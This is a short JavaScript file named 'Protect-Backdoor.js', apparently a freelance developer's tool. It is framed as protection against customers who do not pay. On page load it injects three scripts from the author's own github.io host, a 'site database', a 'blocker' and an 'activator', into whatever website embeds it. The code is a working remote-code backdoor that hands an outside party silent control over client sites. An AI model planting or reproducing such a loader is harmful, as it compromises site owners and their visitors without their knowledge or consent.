/*!
 * Protect-Backdoor.js v1.0.1
 * (c) 2024-2024
 * Made to protect against scammers.
 * by Deus Notam
 * Telegram Channel → https://t.me/deusnotam
 * Telegram Group → https://t.me/d3usn0tam
 * Данный скрипт разработан в целях защиты от недобросовестных заказчиков.
 * This script was developed to protect against unscrupulous customers.
 */

// Проверка, был ли ранее подключен файл
if (!window.D3usN0tamProtect) {
  console.log("D3usN0tam Protect - Connected!\n\nMade by D3us N0tam\nTelegram Channel → https://t.me/deusnotam\nTelegram Group → https://t.me/d3usn0tam\n\nДанный скрипт разработан в целях защиты от недобросовестных заказчиков.\nThis script was developed to protect against unscrupulous customers.");

  // Подключение data.js - база данных сайтов
  var dataScript = document.createElement('script');
  dataScript.src = 'https://deusnotam.github.io/protect/data.js';
  document.head.appendChild(dataScript);

  // Подключение blocker.js - база эффектов
  var blockerScript = document.createElement('script');
  blockerScript.src = 'https://deusnotam.github.io/protect/scripts/blocker.js';
  document.head.appendChild(blockerScript);

  // Подключение activator.js - база эффектов
  var activatorScript = document.createElement('script');
  activatorScript.src = 'https://deusnotam.github.io/protect/scripts/activator.js';
  document.head.appendChild(activatorScript);

  // Устанавливаем флаг, что файл подключен
  window.D3usN0tamProtect = true;
}
